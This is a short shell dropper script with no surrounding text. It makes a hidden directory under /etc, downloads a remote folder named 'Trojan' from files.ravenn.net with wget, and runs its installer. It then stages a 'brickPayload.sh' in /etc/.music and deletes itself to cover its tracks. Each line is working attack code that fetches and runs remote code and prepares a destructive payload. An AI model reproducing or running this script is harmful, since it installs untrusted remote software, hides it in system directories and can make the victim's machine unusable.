mkdir /etc/.a
wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan
mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a
echo "Download complete. Starting installer."
chmod +x /etc/.a/Trojan/install.sh
bash /etc/.a/Trojan/install.sh
echo "Install complete. Preping brick payload."
mv /etc/.a/files.ravenn.net/horror/brickPayload.sh /etc/.music
echo "Total completion. Goodbye"
rm -- "$0"